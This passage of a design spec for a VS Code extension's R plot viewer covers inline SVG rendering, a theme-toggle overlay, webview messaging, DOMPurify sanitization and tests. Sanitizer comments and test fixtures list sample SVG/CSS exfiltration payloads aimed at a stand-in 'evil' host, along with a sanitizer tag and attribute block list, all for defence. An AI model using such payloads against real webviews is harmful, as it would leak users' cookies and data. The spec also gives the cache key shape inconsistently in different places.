            // cache for this key with an at-least-equal `upid`, don't
            // overwrite with our older bytes. This is mostly defensive —
            // the `state.activeSession?.upid !== capturedUpid` guard above
            // catches the common single-upid-bump TOCTOU because
            // `activeSession.upid` only advances via host state-update
            // messages and is monotonic. The freshness re-check matters
            // when a sibling fetch with the SAME upid (e.g. a resize that
            // triggered a refetch under the same upid but at a different
            // size, populating a different cache key — but if a future
            // refactor ever introduces same-key same-upid double-fetches,
            // this guards against the later-finishing one clobbering the
            // earlier-finishing one). Uses `>=` (not `>`) so a same-upid
            // race doesn't slip through; same-upid + same-bytes is
            // additionally caught by the reducer's no-op short-circuit.
            const existing = state.svgCache.get(cacheKey);
            if (existing && existing.upid >= capturedUpid) return;
            const sanitized = sanitize_svg(text);
            dispatch({
                type: 'SET_SVG_CACHE_ENTRY',
                cacheKey,
                entry: { svgText: sanitized, upid: capturedUpid },
            });
        })
        .catch(() => { /* aborted or transport error — leave placeholder */ });
});
```

The effect DOES read `state.themeApplied` (via `bg_for_fetch(state.themeApplied)`), so Svelte registers it as a dependency. Today's helper returns the same value (`'#ffffff'`) for both `true` and `false`, so the toggle flip refires the effect but the cache lookup short-circuits before the network fetch (`cached.upid === upid` returns true after the first fetch). One spurious effect run on toggle flip, no spurious fetch.

This is the **single load-bearing coupling point** for future bg-vs-toggle changes: a future feature that wants the toggle-on path to render against transparent (or the editor bg directly baked into the SVG) modifies `bg_for_fetch` only, and the effect's dependency tracking already covers it. The cache key (plotId, upid) does NOT include `themeApplied` because the SVG bytes are identical — if a future change makes that false, the cache key must extend too.

```typescript
// In editors/vscode/src/plot/webview/state.ts (or a separate helper file):
export function bg_for_fetch(themeApplied: boolean): string {
    // Today both branches return '#ffffff' — see the architecture section's
    // "Background parameter" discussion for why we don't pass null or the
    // editor bg here. A future change wanting a different toggle-on bg
    // would update this single function AND extend the svgCache key to
    // include themeApplied (since the rendered SVG bytes would diverge).
    return '#ffffff';
}
```

#### Background parameter

Today's webview passes `bg=themeBg` (the editor's `--vscode-editor-background` hex). It has no visible effect because R's drawing engines paint a `<rect>` over it. Spec v2 simplified to `bg=null` (omit the parameter). Adversarial review flagged that httpgd's behavior with `bg` omitted is **unspecified by Raven** — it could default to `transparent`, `white`, or something else depending on httpgd version.

**v3 decision**: pass an explicit `bg='#ffffff'` to lock the behavior down. Rationale:

- **Toggle OFF**: R's canvas rect is opaque white (default `par("bg")` or `theme_grey()`'s plot background). The SVG document bg is also white. User-visible: white plot. Matches today.
- **Toggle ON**: R's canvas rect is *hidden by the CSS overlay* (`fill: none !important` on `rect:first-of-type`). The SVG document bg is white, but because the SVG inline element has `background: transparent` (default), the webview body's `--vscode-editor-background` shows through. Wait — does it?

This needs verification. An inline `<svg>` element with `width=W height=H` and a non-default background only paints what its child elements draw. The "SVG document background" set via httpgd's `bg=` parameter is rendered as a `<rect>` covering the canvas, NOT as a CSS background on the `<svg>` root. So passing `bg='#ffffff'` to httpgd produces `<rect fill="#ffffff">` as the first child — exactly the rect our overlay hides. With it hidden, the SVG root's CSS background (transparent) wins, and the webview body's `--vscode-editor-background` shows through. **Correct behavior.**

So the chain holds:
- `bg='#ffffff'` → httpgd emits `<rect fill="#ffffff">` as the first child.
- Toggle OFF: rect visible → user sees white background (today's behavior, preserved).
- Toggle ON: overlay hides rect → webview body bg shows through (the desired theme effect).

The alternative — passing `bg=null` and relying on httpgd's default — leaves us at the mercy of httpgd version drift. The opaque `bg='#ffffff'` is the safer commitment.

**Watch-out for ggplot's `theme(plot.background = element_rect(fill = NA))`**: a user can explicitly set ggplot's plot background to transparent, in which case ggplot does NOT paint over httpgd's canvas rect, so even with toggle OFF the user sees the httpgd `<rect fill="#ffffff">`. Same as today. No regression.

### CSS overlay

Lives in `App.svelte`'s `<style>` block (added by this design — App.svelte today has no `<style>` block). Using Svelte's own scoping API rather than a separate stylesheet eliminates the fragility around "what does Svelte do with this class today" — `:global(...)` is the documented, stable way to write selectors that target `{@html}` content:

```svelte
<style>
    .plot-host.apply-vscode-theme :global(svg.httpgd > rect:first-of-type) {
        fill: none !important;
        stroke: none !important;
    }

    .plot-host.apply-vscode-theme :global(svg.httpgd text) {
        fill: var(--vscode-editor-foreground) !important;
        font-family: var(--vscode-editor-font-family) !important;
    }

    .plot-host.apply-vscode-theme :global(svg.httpgd line),
    .plot-host.apply-vscode-theme :global(svg.httpgd polyline),
    .plot-host.apply-vscode-theme :global(svg.httpgd polygon),
    .plot-host.apply-vscode-theme :global(svg.httpgd path),
    .plot-host.apply-vscode-theme :global(svg.httpgd circle),
    .plot-host.apply-vscode-theme :global(svg.httpgd rect:not(:first-of-type)) {
        stroke: var(--vscode-editor-foreground) !important;
    }
</style>
```

Svelte's CSS scoping rewrites `.plot-host` and `.apply-vscode-theme` to component-scoped classes (e.g. `.plot-host.svelte-abc123.apply-vscode-theme.svelte-abc123`) — both classes are emitted on the host `<div>` because App.svelte writes them there. The `:global(...)` wrappers escape scoping for the descendant selectors, which is what we need because the SVG content from `{@html}` doesn't carry App.svelte's component hash.

**Why not put it in `styles.css`?** That file is loaded as a plain `<link>` and CSS is global by default — selectors would work without `:global()`, but the host `<div>`'s class names would still need to match. Mixing a Svelte-scoped class selector (`.plot-host`) in a non-Svelte CSS file means hoping Svelte doesn't rewrite the class name on the element. This was v3's approach; v4 abandons it in favor of co-locating the overlay with the component that owns the class.

Notes:

- **Use `--vscode-editor-foreground`** (the variable matching `--vscode-editor-background`), not `--vscode-foreground` (a more generic VS Code chrome color). Verified: `--vscode-editor-foreground` is exposed in webviews per VS Code's documented webview-CSS-variable list.
- **`:first-of-type` selector for the canvas rect**. vscode-R uses `.httpgd rect` (broader) combined with `.httpgd rect:not(:first-of-type)` for the stroke override. Result is identical to ours but we're explicit about which rect is the canvas.
- **`!important`** is required because httpgd emits inline `stroke="..."` / `fill="..."` on SVG elements; without `!important`, inline-style specificity wins and the overlay does nothing.

### Sanitization

New helper: `editors/vscode/src/plot/webview/sanitize.ts`:

```typescript
import DOMPurify from 'dompurify';

export function sanitize_svg(text: string): string {
    return DOMPurify.sanitize(text, {
        USE_PROFILES: { svg: true, svgFilters: true },
        // DOMPurify's SVG profile already forbids <script>, event handlers,
        // and javascript: URLs. We additionally forbid three tags the
        // profile permits but httpgd doesn't emit:
        //   - <use> and <image>: can reference external resources via href
        //     (e.g. `<use href="http://evil/track">`). CSP would likely
        //     block the fetch, but defense-in-depth.
        //   - <a>: has SVG-specific event semantics around xlink:href that
        //     can interfere with the right-click → Copy contextmenu handler
        //     on the host div.
        FORBID_TAGS: [
            'use',    // can reference external resources via href.
            'image',  // ditto.
            'a',      // interferes with right-click → Copy contextmenu.
            // <style> inside SVG is the second-class CSS-exfil channel
            // (the first is inline `style=` attrs, covered by FORBID_ATTR
            // below). DOMPurify's SVG profile permits <style>; a malicious
            // R user emitting `<style>@import url(//evil/?cookie)</style>`
            // inside the SVG would exfil via a CSS request even though
            // `style="..."` attrs are gone. httpgd doesn't emit <style>,
            // so dropping it costs nothing.
            'style',
            // <foreignObject> can host arbitrary HTML, which is a much
            // wider attack surface than SVG itself. httpgd doesn't emit
            // it; forbidding closes one more vector.
            'foreignObject',
            // <feImage> inside the svgFilters profile can reference
            // external resources via href/xlink:href, the same vector as
            // <image>. httpgd doesn't emit filter primitives in normal
            // R/ggplot output, so the cost is zero.
            'feImage',
        ],
        // FORBID_ATTR: ['style'] is the load-bearing line for our CSP. The
        // panel's CSP keeps `style-src 'unsafe-inline'` (required so
        // Svelte-scoped <style> blocks work; flipping it off would break
        // every other Raven webview convention). So a malicious R user
        // emitting `<rect style="background:url(//evil/?cookie)">` could
        // exfiltrate via CSS request even though we sanitize tags. httpgd
        // uses inline `fill=`/`stroke=` attributes, not `style="..."`, so
        // dropping `style` costs nothing and closes the CSS-exfil path.
        FORBID_ATTR: ['style'],
        // We intentionally do NOT pass `ADD_ATTR: ['class', 'xmlns',
        // 'viewBox']`. DOMPurify's SVG profile preserves those by
        // default — `ADD_ATTR` is for attributes the profile does NOT
        // already permit, so listing them here was misleading
        // documentation and a false-security claim about forward
        // compatibility. The real guard against a future profile
        // change is the `<svg class="httpgd">` regression test in
        // `plot-webview-sanitize.test.ts` — if DOMPurify ever drops
        // `class` from its SVG profile, the test fails loudly. Pin
        // DOMPurify with an exact version in `package-lock.json` so
        // an unintended bump can't silently relax this.
    });
}
```

Add `dompurify` (pinned to the latest stable release as of implementation time — record the exact version in a doc comment AND in `CLAUDE.md` under "Learnings → Environment / tooling" since security deps deserve explicit pins) and `@types/dompurify` as a dev dep to `editors/vscode/package.json` (the VS Code extension's `package.json`, not the root). The webview is bundled via the Svelte build, so DOMPurify ships as part of the webview chunk.

Sanitization is applied to every fetched SVG before insertion. Cost is small (DOMPurify is fast — μs-to-low-ms range for typical SVG sizes). Failure mode: DOMPurify returns a string; if the input is malformed, the output is the salvaged subset (empty in worst case). The webview falls back to the no-plot placeholder via `pick_current_svg() === null` if `sanitize_svg` returns the empty string.

`vscode.WebviewPanelOptions.localResourceRoots` is unchanged by this design — DOMPurify ships as JS inside the bundled webview chunk, not as a separate loaded resource.

### Host changes

`editors/vscode/src/plot/plot-viewer-panel.ts`:

- New `static readonly THEME_PREFERENCE_KEY = 'raven.plot.applyVSCodeTheme'` (mirroring `KnitOutputPanel.THEME_PREFERENCE_KEY` for cross-feature symmetry).
- New `static readThemePreference(context: vscode.ExtensionContext): boolean` helper that reads `context.globalState.get(THEME_PREFERENCE_KEY, false)` — consumed by `build_html` for initial-render baking AND by `PlotServices.broadcastStateUpdate` so the orchestrator doesn't need to know the key string.
- Pass `themeApplied` to `build_html` so the initial render bakes the value (avoiding a flash). See "Initial-render seeding" below.
- Include `themeApplied` in `post_state_update()`'s payload.
- `on_webview_message` gains a case for `set-theme-applied`:
  - Already validated by `isWebviewToExtensionMessage`.
  - `await context.globalState.update(THEME_PREFERENCE_KEY, msg.payload.applied)` — the `await` is load-bearing for the cross-panel race: any panel being created concurrently (or any later `webview-ready` round-trip) reads from `globalState` and must see the new value. Without the await, broadcastStateUpdate can read the OLD value off Memento and post the wrong `themeApplied` to other panels.
  - Then call `PlotServices.broadcastStateUpdate()` to update all open panels.

#### Initial-render seeding

`build_html` is synchronous and returns the static webview HTML string before the Svelte app mounts. Three options for getting `themeApplied`'s initial value into the first paint:

- **(a) Inline a nonce-protected `<script>` global** before the Svelte bundle loads:
    ```html
    <script nonce="<nonce>">window.__ravenInitialPlotState = {"themeApplied":<bool>};</script>
    <script nonce="<nonce>" src="…/dist/webviews/plot-viewer/index.js"></script>
    ```
    The Svelte App reads `window.__ravenInitialPlotState?.themeApplied ?? false` inside `onMount` (NOT inside `initial_state()` — bun unit tests import `state.ts` without a DOM, and a top-level `window` read would `ReferenceError`). The reader dispatches `SET_THEME_APPLIED` on mount, which the initial render picks up before the first paint completes. **Important**: the dispatch happens synchronously inside `onMount`, BEFORE `vscode.postMessage('webview-ready')`, so the initial paint reflects the persisted value. There is no "bake the class on `<body>` for the pre-mount paint" trick — the overlay selector is `.plot-host.apply-vscode-theme`, scoped to a Svelte-component element that does not exist before mount; an early body class would not match it. After reading, `delete window.__ravenInitialPlotState` so a later panel restore (`retainContextWhenHidden: true` keeps the JS context, but a host-initiated `webview.html =` re-assignment re-runs the bundle) doesn't clobber a meanwhile-updated value with the stale seed. Knit preview uses an analogous pattern.
- **(b) Bake the class string directly** into the body HTML: e.g. `<div id="raven-plot-app" data-theme-applied="<bool>">` and have the Svelte mount read the attribute.
- **(c) Skip pre-baking**: accept that the first paint shows `themeApplied=false`, then the `webview-ready → state-update` round-trip applies the persisted value. Visible flash on the order of one or two frames.

**Decision: (a)**. Mirrors knit preview, simple, and the global string `__ravenInitialPlotState` makes the wire fact explicit. The trust boundary is unchanged — every value in the payload comes from `context.globalState`, fully controlled by Raven; we serialize the WHOLE payload via `JSON.stringify(payload)` (not field-by-field interpolation) so a future field can't be added with an injection-prone string interpolation. The regression test asserts the emitted script content matches `<script nonce="…">window.__ravenInitialPlotState = {"themeApplied":(?:true|false)};</script>` exactly — a stricter end-to-end pattern than "the slot is literal true/false" because it guards against accidentally widening the shape later.

`editors/vscode/src/plot/index.ts` (`PlotServices`):

- New `broadcastStateUpdate()` method iterating `this.panels.values()` and calling each panel's `postStateUpdate()`. The current theme value is read via `PlotViewerPanel.readThemePreference(context)` so the orchestrator doesn't own the key string — single source of truth on the panel class.

**No-echo invariant (webview side)**: the webview MUST NOT post `set-theme-applied` in response to a received `state-update`. The button click handler is the *only* source of `set-theme-applied`. The webview's `on_message` handler for `state-update` explicitly dispatches BOTH `SET_ACTIVE_SESSION` (existing) AND `SET_THEME_APPLIED` (new) — pure reducer actions, no outbound message:

```typescript
case 'state-update':
    attach_session(msg.payload.activeSession, msg.payload.sessionEnded);
    dispatch({ type: 'SET_THEME_APPLIED', themeApplied: msg.payload.themeApplied });
    break;
```

The `SET_THEME_APPLIED` reducer case short-circuits when `state.themeApplied === action.themeApplied` (returning the same state reference so Svelte's `$state` skips the cascade — see "Reducer no-op short-circuit" below). Without the no-echo invariant the broadcast would feedback-loop:

```text
panel A click → set-theme-applied → host writes Memento → broadcastStateUpdate
              ↓
panel A receives state-update (themeApplied=true) → reducer SET_THEME_APPLIED
panel B receives state-update (themeApplied=true) → reducer SET_THEME_APPLIED
```

Regression coverage is split across two test surfaces. The bun-level test in `tests/bun/plot-webview-state.test.ts` only exercises the reducer surface (it dispatches `SET_THEME_APPLIED` and asserts `Object.is(prev, next)` on a no-op transition, and asserts a real flip returns a new state object) — this is necessary but not sufficient because reducers can't post messages anyway. The load-bearing test is the VS Code integration test in `editors/vscode/src/test/plot/theme-toggle.test.ts`, which drives a real `WebviewPanel`, posts a `state-update` from the host, and asserts the webview does NOT echo back a `set-theme-applied`. Both layers must be present.

**Reducer no-op short-circuit**: `SET_THEME_APPLIED` returns `state` unchanged when `state.themeApplied === action.themeApplied`. This is a perf nicety (a panel receiving its own broadcast doesn't trigger an identity-change cascade through `$state`), not a correctness requirement. The same short-circuit could be applied to other reducer cases later if profiling shows it matters; for now, only the broadcast-prone action gets it.

**`theme-changed` message and its listener are deleted.** Today the host's `vscode.window.onDidChangeActiveColorTheme` listener posts `{ type: 'theme-changed' }`, and the webview's `on_message` switch refreshes `themeBg` in response. With inline SVG, CSS variables auto-update on theme switch — no message round-trip is needed. The deletion touches: `messages.ts` (union, allowlist, guard switch), the host's `onDidChangeActiveColorTheme` callback (deleted entirely), the webview's `on_message` switch, and the test in `plot-messages.test.ts` (asserts the type is now rejected — see trust-boundary regression list).

### Trust boundary

The plot viewer's trust boundary is `isWebviewToExtensionMessage` and `isExtensionToWebviewMessage`. The new `set-theme-applied` message and the extended `state-update` shape both go through it. Regression tests must cover:

1. `set-theme-applied` with `payload.applied = true` is accepted.
2. `set-theme-applied` with `payload.applied = false` is accepted.
3. `set-theme-applied` with missing or non-boolean `applied` is rejected.
4. `state-update` with `themeApplied` non-boolean is rejected.
5. `state-update` with `themeApplied` missing is rejected.
6. The deleted `theme-changed` is rejected on both directions (covers the removal).

Extra-key tolerance follows the existing plot-guard style (additional keys in payload are ignored, not rejected). Tightening to exact-shape matching would be a separate cleanup that touches every existing message type.

The CSS overlay itself is bundled at build time and uses only CSS-variable references — no host-emitted strings go into `style.textContent`. This is materially simpler than the knit preview's palette-CSS trust boundary (no `RAVEN_PALETTE_CSS_RE` analogue needed).

The new attack surface is **SVG content from httpgd**, mitigated by DOMPurify in SVG mode. The threat model is "user runs malicious R code in their own R session" — already RCE — so this is defense-in-depth, not a primary security boundary. Still worth doing.

### Save / Copy / Open externally

Unchanged. These flows already pass `bg=null` (Copy) or build URLs without `bg=` (Save via host, Open externally). The toggle does not affect them.

One subtle change: today `copy_current()` constructs the httpgd URL and `await fetch(url)` then writes to clipboard. After this design, the webview has live SVG text in the cache (`state.svgCache.get(cacheKey)`). For PNG copy, the existing fetch-and-clipboard flow stays — clipboard wants a PNG blob, not SVG text. For SVG copy (future feature?), we'd read from the cache directly. Not a goal here.

**Copy post-quit behavior**: today's `copy_current` fetches from httpgd, which dies with R, so Copy is already broken post-quit (the user gets a `report-error` with the fetch failure). The new design preserves this limitation — Copy goes through the live httpgd URL, not the cache. Documented; smoke test #9 should assert Copy is disabled OR fails gracefully (no UI breakage) in the post-quit state. A future enhancement could render the cached SVG to a PNG canvas and copy that, but it's out of scope.

## Implementation phases

### Phase 1: Switch substrate to inline SVG (foundation)

**This phase has user-visible changes** — calling it a "pure refactor" misrepresents the work. Two changes ship in Phase 1 alone:

1. **Background semantics**: today the live URL passes `bg=state.themeBg` (the editor `--vscode-editor-background` hex); Phase 1 changes this to `bg='#ffffff'` unconditionally. For *typical* R/ggplot output (which paints its own opaque canvas anyway), there's no visible difference. For ggplot with `theme(plot.background = element_rect(fill = NA))` (rare but legal), today's behavior shows the editor bg through the transparent panel; Phase 1's behavior shows white. Documented in `docs/plot-viewer.md`.

2. **History navigation cap**: today's `<img>` design has no Raven-imposed cap on cached plot history (the browser image cache holds everything it has memory for). Phase 1 introduces a 50-entry LRU. A user with 51+ plots in history loses the ability to walk to the oldest plots post-quit. 50 × ~100 KB ≈ 5 MB feels generous for typical sessions; if real usage data shows this is too small, raise the cap or switch to byte-budget eviction.

Implementation tasks:

- Add `dompurify` and `@types/dompurify` deps in `editors/vscode/package.json` (the VS Code extension's package.json, not the root).
- New `editors/vscode/src/plot/webview/sanitize.ts` with `sanitize_svg`.
- Rewrite `App.svelte`'s `<img>` to `<div class="plot-host">` with `{@html sanitized SVG}`.
- Add `<style>` block to App.svelte (none today) with the overlay rules. Defer the `.plot-host.apply-vscode-theme :global(...)` selectors to Phase 4 (those depend on the toggle class which doesn't exist yet) — Phase 1 ships a stripped-down `<style>` block.
- Replace `pick_image_src` with `pick_current_svg`; delete `SET_THEME_BG`; delete `themeBg`; delete `read_theme_bg()` helper (no remaining caller); delete `cached_snapshot` blob URL machinery and `revoke_cached_snapshot`.
- Introduce `svgCache: SvelteMap<string, SvgEntry>` with `SET_SVG_CACHE_ENTRY` action and reducer (incl. `evict_oldest`).
- Update the live `$effect` to fetch SVG text and dispatch `SET_SVG_CACHE_ENTRY`. Remove the now-redundant `compute_snapshot_key` helper and its tests.
- Delete `theme-changed` entirely on both sides. CSS variables auto-update inline SVG, so the round-trip is genuinely dead code; "becomes a no-op listener" would still allocate a `vscode.Disposable` per panel and is worse than deletion. Concrete deletion sites (Phase 1 checklist):
  1. `editors/vscode/src/plot/messages.ts`: remove the `'theme-changed'` member from `ExtensionToWebviewMessage`, remove `'theme-changed'` from `EXTENSION_TO_WEBVIEW_TYPES`, remove the `case 'theme-changed': return true;` branch in `isExtensionToWebviewMessage`.
  2. `editors/vscode/src/plot/plot-viewer-panel.ts`: delete the `private theme_sub: vscode.Disposable | null = null;` field declaration; delete `this.theme_sub?.dispose(); this.theme_sub = null;` in `dispose()`; delete the same pair in `panel.onDidDispose`; delete the `this.theme_sub = vscode.window.onDidChangeActiveColorTheme(...)` registration block in `create_panel`.
  3. `editors/vscode/src/plot/webview/App.svelte`: delete the `case 'theme-changed':` branch in `on_message`.
  4. `tests/bun/plot-messages.test.ts`: replace the "extension-to-webview includes theme-changed" test with an "extension-to-webview rejects theme-changed (post-v6)" test that asserts `isExtensionToWebviewMessage({ type: 'theme-changed', payload: {} })` is `false`.
- Update `plot/messages.ts` and trust-boundary tests for the removed type.
- CSP cleanup: drop `blob:` and `data:` from `img-src` directive in `csp.ts` / `plot-viewer-panel.ts`. **Pre-cleanup audit**: grep the built `editors/vscode/dist/webviews/plot-viewer/index.css` and `index.js` for `data:` URLs. If any are present (e.g. inlined toolbar icons in CSS), either keep `data:` in `img-src` or refactor those references to `webview.cspSource`-served files. The substrate switch removes the runtime *uses* of `data:`/`blob:` (no more `URL.createObjectURL`, no more `<img src=data:...>`), but the bundler might still produce data-URL assets at build time.
- Existing tests for `pick_image_src` rewrite to target `pick_current_svg`.
- New tests for `sanitize_svg`: strips `<script>`, strips `onclick=`, strips `javascript:`, preserves benign SVG structure.
- New tests for `evict_oldest` and LRU behavior in `plot-webview-state.test.ts`.

### Phase 2: Wire protocol + reducer for theme toggle

- Extend `messages.ts` with `set-theme-applied` and `themeApplied` in `StateUpdatePayload`.
- Extend `state.ts` with `themeApplied` field and `SET_THEME_APPLIED` action.
- Regression tests in `plot-messages.test.ts` and `plot-webview-state.test.ts`.

### Phase 3: Host persistence + broadcast

- Add `THEME_KEY` constant to `plot/index.ts`.
- Add `broadcastStateUpdate()` to `PlotServices`.
- Read initial `themeApplied` in `create_panel`/`build_html`; include in `post_state_update`.
- Handle `set-theme-applied` in `on_webview_message`; write Memento; call `broadcastStateUpdate`.

### Phase 4: Webview UI

- New "Apply VS Code theme" button in `App.svelte` toolbar, mirroring knit-preview styling.
- `class:apply-vscode-theme={state.themeApplied}` on the plot host div.
- Add the `.plot-host.apply-vscode-theme :global(...)` CSS rules in `App.svelte`'s `<style>` block (the four blocks shown in §CSS overlay above). Phase 1 introduced the empty `<style>` block; Phase 4 completes it with the toggle-scoped selectors. `editors/vscode/src/plot/webview/styles.css` is NOT modified by this phase — Svelte component scoping is the load-bearing mechanism that makes the host div's `.apply-vscode-theme` class actually match the selector.
- Bake the initial `apply-vscode-theme` class state into the shell HTML at panel-create time (avoid flash) via `window.__ravenInitialPlotState.themeApplied`.

### Phase 5: Docs + invariants

- `docs/plot-viewer.md`: new "Color theme" section. Cross-reference [`docs/coexistence.md`](../coexistence.md) and [`docs/knit.md`](../knit.md) for related theme handling.
- `docs/coexistence.md`: one-sentence parity note about REditorSupport.R's `r.plot.toggleStyle`.
- `CLAUDE.md`: new subsection under "Key invariants" describing:
  - The inline-SVG rendering substrate (and why — CSS scoping).
  - Sanitization invariant: every SVG text from httpgd flows through `sanitize_svg` before `{@html}`. DOMPurify is configured with `FORBID_ATTR: ['style']` (CSS-exfiltration defense behind `style-src 'unsafe-inline'`) and `FORBID_TAGS: ['use', 'image', 'a', 'style', 'foreignObject']` (closes external-href, contextmenu-interception, CSS-`@import`, and arbitrary-HTML hosting attack surfaces). The `class="httpgd"` attribute and `viewBox` attribute are load-bearing for the overlay's selectors — they're preserved by DOMPurify's SVG profile today, and the regression test in `tests/bun/plot-webview-sanitize.test.ts` asserts they survive sanitization (the test is the guard against a future DOMPurify profile change silently breaking the toggle).
  - Toggle broadcast invariant: a `set-theme-applied` from any panel updates Memento AND broadcasts to all open panels via `PlotViewerPanel.readThemePreference` (single source of truth).
  - **No-echo invariant**: the webview never posts `set-theme-applied` in response to `state-update`. The button click handler is the *only* outbound source.
  - **onMount-ordering invariant**: `App.svelte`'s `onMount` MUST install the `window.addEventListener('message', ...)` listener BEFORE posting `webview-ready`. The host responds to `webview-ready` synchronously with a `state-update` that re-asserts the persisted `themeApplied`; if the listener isn't installed yet, the message is dropped and the panel boots with `themeApplied=false` (from the initial-render seed) regardless of the persisted value. Today's code already follows this order; the invariant pins it against future re-ordering.
  - **No host-initiated `state-update` from `create_panel`**: the host posts `state-update` ONLY from `on_webview_message`'s `webview-ready` branch and from `post_state_update()` (called by `notifyPlotAvailable`, `notifySessionEnded`, and `broadcastStateUpdate`). Posting from inside `create_panel` would race the webview's onMount listener install — the message would be sent before the listener exists, even with onMount-ordering done right (because the listener is installed *during* mount, which is after `create_panel` returns). The webview-ready round-trip is the single bottleneck that guarantees the listener is live before any state arrives.
  - The `bg=` parameter is `'#ffffff'` in the live preview fetch — re-introducing a theme-dependent value would require adding `state.themeApplied` to the fetch effect's dependencies AND updating the CSS overlay's hidden-rect assumption AND extending the cache key to include `themeApplied`.
  - SVG cache key shape: `${sessionId}:${plotId}`. Bypassing the sessionId prefix would let one R session's plot bytes serve another's identically-named plot (httpgd plotIds are short and can collide across fresh sessions).
  - Cache eviction policy: FIFO over insertion order, not LRU. Touching the cache on read is intentionally not implemented; if a future need arises, add a `TOUCH_SVG_CACHE_ENTRY` action dispatched from the effect's cache-hit branch.
  - DOMPurify SVG profile is the only path from httpgd to the DOM. Bypassing it would re-open XSS via SVG.
- **Phase 5 also adds a regression smoke test** that asserts httpgd's actual SVG output starts with `<svg class="httpgd"` and contains a `<rect>` as its first child element. This is the load-bearing assumption of the CSS overlay; if a future httpgd version changes the structure, the overlay silently breaks. Test lives in `tests/bun/plot-httpgd-svg-structure.test.ts` and runs against a real R subprocess (sandbox-skipped via `isClaudeCodeSandbox()` per existing convention).

## Test plan

**Bun unit tests** (new and updated):
- `plot-messages.test.ts`: extended for `set-theme-applied` + new `state-update` shape; removal of `theme-changed` validated on both directions.
- `plot-webview-state.test.ts`: substantial rewrite. New tests:
  - `SET_THEME_APPLIED` action toggles `themeApplied`.
  - `SET_THEME_APPLIED` with `themeApplied === state.themeApplied` returns the SAME state reference (`Object.is(prev, next)` === true) — the no-op short-circuit.
  - `SET_SVG_CACHE_ENTRY` adds an entry, returns a new Map identity for Svelte reactivity.
  - FIFO eviction kicks in at cap 50; oldest INSERTED entry evicted (not the least-recently-read).
  - Re-inserting an existing cacheKey (upid bump) moves it to most-recent insertion slot in the FIFO order.
  - `pick_current_svg` returns null when cache empty, returns matching entry when populated, returns null on upid mismatch during live session, tolerates upid mismatch post-quit.
  - `pick_current_svg` post-quit branch is reached when `state.sessionEnded === true` even if `state.activeSession !== null` (regression guard for the v5 fix).
  - Cache key shape: `${sessionId}:${plotId}:${width}:${height}` — switching sessions with the same plotId returns null (no cross-session bleed); same `(sessionId, plotId)` at different `(width, height)` produces distinct keys (live-session lookup returns null on dimension mismatch).
  - Per-plot eviction: a sequence of 200 `SET_SVG_CACHE_ENTRY` dispatches against the same `(sessionId, plotId)` at different `(width, height)` leaves at most ONE entry in the cache for that prefix. Older plots' entries are NOT evicted.
  - Post-quit reverse fallback: when the live-dimension key misses post-quit, `pick_current_svg` returns the MOST recently inserted entry matching `${sessionId}:${plotId}:` (verified by inserting two entries at different sizes and asserting the second-inserted one is returned).
  - History navigation post-quit: `pick_current_svg` returns the cached entry for any previously-viewed plotId.
  - Existing `compute_snapshot_key` tests deleted (function removed).
  - Existing `pick_image_src` tests removed.
- `plot-webview-reactivity.test.ts` (new, Svelte 5 component mount): mount a tiny Svelte component that reads `state.svgCache.get('k')` inside a `$derived`, then dispatch `SET_SVG_CACHE_ENTRY` and assert the derived value updates. This is the only test that meaningfully exercises Svelte 5's collection reactivity under SvelteMap — pure bun reducer tests can verify the Map identity changes but cannot verify Svelte's `$derived` re-runs. Uses jsdom or happy-dom (same DOM provider as `plot-webview-sanitize.test.ts`). If Svelte 5 component testing under bun proves cumbersome, this test can fall back to a unit test that exercises `effect_root` / `$state.snapshot` directly — see Svelte 5's testing docs.
- `plot-webview-sanitize.test.ts` (new): `sanitize_svg` against a fixture corpus:
  - Benign httpgd-style SVG passes through unchanged.
  - **`<svg class="httpgd">` keeps the `class="httpgd"` attribute** — this is load-bearing for the CSS overlay; if DOMPurify ever drops it, the toggle silently breaks.
  - `<svg viewBox="0 0 480 360">` keeps `viewBox`.
  - `<script>foo()</script>` is stripped.
  - `<rect onclick="x">` has the `onclick` attribute stripped.
  - `<rect style="background:url(//evil/?cookie)">` has the `style` attribute stripped (FORBID_ATTR).
  - `<a xlink:href="javascript:alert(1)">` is stripped entirely (FORBID_TAGS: ['a']).
  - `<use href="//evil/track">` is stripped entirely (FORBID_TAGS: ['use']).
  - `<image href="//evil/track">` is stripped entirely (FORBID_TAGS: ['image']).
  - `<style>@import url(//evil/?cookie)</style>` is stripped entirely (FORBID_TAGS: ['style']).
  - `<foreignObject>...</foreignObject>` is stripped entirely (FORBID_TAGS: ['foreignObject']).
  - Empty input → empty output.
  - Malformed input doesn't throw.
- `plot-bootstrap-content.test.ts`: unchanged (R-side bootstrap doesn't touch this design).
- `plot-httpgd-svg-structure.test.ts` (new): two layers of coverage for the overlay's load-bearing structural assumption (`<svg class="httpgd" ...>` with a `<rect>` first child):
  - **Fixture layer** (always runs): a checked-in SVG file at `tests/fixtures/httpgd/plot-1-10.svg`, captured once from httpgd ≥ 2.0 against `plot(1:10)`. The test parses the fixture and asserts: (a) the root `<svg>` element's `classList.contains('httpgd')` (NOT a string-exact match — a benign httpgd whitespace change like `class="httpgd foo"` would otherwise break CI for no real reason; the CSS selector `svg.httpgd` already does class-token matching); (b) the first element child is a `<rect>`. The test mirrors the runtime selector behavior end-to-end.
  - **Live layer** (sandbox-skipped via `isClaudeCodeSandbox()`): boot R + httpgd, generate a fresh plot, assert the same contract. The fresh SVG must still match the contract — if httpgd ever changes its output structure, this test fails BEFORE the fixture goes stale.
  - The two layers together: the fixture guards the parser against bit-rot when CI can't run R; the live layer guards the fixture against upstream httpgd changes when CI can.

**VS Code integration tests** (new and updated):
- `editors/vscode/src/test/plot/theme-toggle.test.ts` (new): boot a real `PlotViewerPanel`, simulate webview posting `set-theme-applied`, verify Memento is updated. Open a second `PlotViewerPanel` for a different sessionId, post `set-theme-applied(true)` on panel A, verify panel B also receives a `state-update` with `themeApplied: true` (broadcast invariant).
- `editors/vscode/src/test/plot/inline-svg.test.ts` (new): verify the rendered DOM contains a `<div class="plot-host">` with inline `<svg class="httpgd">` (not an `<img>`). Also verify the `oncontextmenu` handler on the div fires on right-click (regression guard for the substrate switch).
- `editors/vscode/src/test/plot/settings.test.ts`: no additions (no new settings).
- `editors/vscode/src/test/plot/csp.test.ts`: extended to verify `img-src` no longer lists `blob:` (it shouldn't, after Phase 1 cleanup) and `script-src` is still nonce-gated.

**Manual smoke** (for the implementer):
1. Open a plot panel, run `plot(1:10)` in a dark theme: expect httpgd-default white background (default-off behavior unchanged from today).
2. Click the toggle: expect background to flip to editor dark bg, axis labels to recolor to light foreground.
